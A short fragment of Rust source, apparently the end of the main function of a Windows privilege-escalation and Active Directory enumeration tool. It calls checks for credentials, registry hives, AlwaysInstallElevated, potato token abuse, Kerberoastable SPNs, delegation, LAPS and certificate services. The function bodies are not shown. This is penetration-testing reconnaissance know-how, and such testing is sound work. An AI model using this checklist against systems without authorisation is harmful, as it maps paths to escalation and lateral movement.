    check_defender();
    check_credentials();
    check_hive_access();
    check_paths();
    check_services();
    check_tasks();
    check_always_elevated();
    check_containers();
    check_network();
    check_files();
    check_potato();
    
    // AD enumeration (only if domain joined)
    if is_domain_joined() {
        check_ad_info();
        check_ad_users();
        check_ad_spn();
        check_ad_delegation();
        check_ad_laps();
        check_ad_adcs();
        check_ad_shares();
        check_ad_trusts();
        ad_summary();
    }
    
    summary();
    
    println!("\n\x1b[1;32m[✓]\x1b[0m Enumeration complete\n");
}
